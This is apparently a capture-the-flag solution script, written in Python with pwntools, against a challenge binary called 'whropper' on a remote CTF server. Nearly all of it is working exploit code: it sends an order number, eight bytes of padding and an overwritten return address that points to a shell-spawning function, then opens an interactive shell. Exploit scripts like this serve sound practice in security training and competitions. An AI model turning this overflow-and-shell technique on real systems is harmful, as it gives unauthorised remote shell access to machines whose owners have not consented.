#######################################
# This is a fairly simple ROP exploit
# where you have the ability to overflow
# the buffer (after ensuring you use a
# valid order number first)
# You then just need to drop the path to
# the vulnerable system call function
#######################################

from pwn import *

binshaddr = 0x400656  #0x4005b7 for hpy's ver

#r = process("./whropper") #if running locally with binary file
r = remote("binary.hashbangctf.com", "7777")
r.recvuntil("10: Buffer buffet\n")

exploit = "10" + 'A'*8
exploit += p64(binshaddr)
print("Payload:" + exploit)

r.sendline(exploit)
r.interactive()
